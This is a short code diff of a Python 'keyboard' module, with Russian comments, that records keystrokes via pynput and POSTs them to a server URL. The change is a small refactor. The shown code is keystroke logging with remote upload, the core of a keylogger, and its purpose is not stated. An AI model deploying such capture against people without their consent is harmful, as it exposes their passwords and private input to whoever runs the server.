@@ -1,13 +1,13 @@
 from threading import Thread
 from pynput.keyboard import Listener
-from time import time, sleep
+from time import time
 from . import BaseModule
 from requests import post
 from logging import info
 
 
 class KeyboardModule(BaseModule):
-    key_events = []
+    key_events = list()
 
     def __init__(self):
         super().__init__(name='keyboard')
@@ -20,11 +20,11 @@ class KeyboardModule(BaseModule):
     def update(self):
         # Метод отправки данных на сервер
         try:
-            post(self.url, json={'id': 0, 'source': 101, 'value': self.key_events})
+            post(self.url, json=dict(id_device=0, source=101, value=self.key_events))
             info(f'Отправлены данные: {self.key_events}')
+            self.key_events.clear()  # Отчищаем массив нажатых клавиш
         except Exception as exception:
             info(f'Возникла проблема при подключению: {exception}')
-        self.key_events.clear()  # Отчищаем массив нажатых клавиш
 
 
 def key_tracking(key_events):
